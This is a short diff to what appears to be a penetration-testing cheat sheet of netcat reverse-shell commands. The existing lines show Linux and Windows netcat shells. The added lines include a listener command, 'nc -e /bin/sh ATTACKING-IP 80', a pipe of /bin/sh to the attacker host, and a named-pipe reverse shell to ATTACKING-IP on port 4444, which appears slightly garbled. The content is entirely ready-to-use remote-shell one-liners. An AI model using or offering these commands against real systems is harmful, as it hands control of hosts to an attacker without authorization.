@@ -30,6 +30,13 @@
 #Linux
 nc <ip-address> <port> -e /bin/sh
 
+nc -lnvp 80
+nc -e /bin/sh ATTACKING-IP 80
+
+#useful syntax
+/bin/sh | nc ATTACKING-IP 80
+rm -f /tmp/p; mknod /tmp/p p && nc ATTACKING-IP 4444 0/tmp/p
+
 #Windows
 nc <ip-address> <port> -e cmd.exe
 
